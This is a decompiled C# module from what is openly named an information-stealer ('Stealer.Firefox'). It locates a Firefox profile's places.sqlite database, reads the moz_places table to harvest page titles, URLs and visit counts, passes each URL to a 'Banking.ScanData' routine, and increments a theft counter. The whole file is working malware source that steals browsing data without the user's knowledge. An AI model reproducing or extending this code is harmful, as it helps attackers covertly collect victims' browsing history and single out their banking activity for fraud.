using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Firefox
{
	// Token: 0x0200001E RID: 30
	internal class cHistory
	{
		// Token: 0x06000092 RID: 146 RVA: 0x00006430 File Offset: 0x00004630
		private static string GetHistoryDBPath(string path)
		{
			try
			{
				string text = path + "\\Profiles";
				bool flag = Directory.Exists(text);
				if (flag)
				{
					foreach (string text2 in Directory.GetDirectories(text))
					{
						bool flag2 = File.Exists(text2 + "\\places.sqlite");
						if (flag2)
						{
							return text2 + "\\places.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000093 RID: 147 RVA: 0x000064D0 File Offset: 0x000046D0
		public static List<Site> Get(string path)
		{
			List<Site> list = new List<Site>();
			try
			{
				string historyDBPath = cHistory.GetHistoryDBPath(path);
				SQLite sqlite = SqlReader.ReadTable(historyDBPath, "moz_places");
				bool flag = sqlite == null;
				if (flag)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Site site = default(Site);
					site.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
					site.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					site.iCount = Convert.ToInt32(sqlite.GetValue(i, 4)) + 1;
					bool flag2 = site.sTitle != "0";
					if (flag2)
					{
						Banking.ScanData(site.sUrl);
						Counter.History++;
						list.Add(site);
					}
				}
				return list;
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}
			return new List<Site>();
		}
	}
}
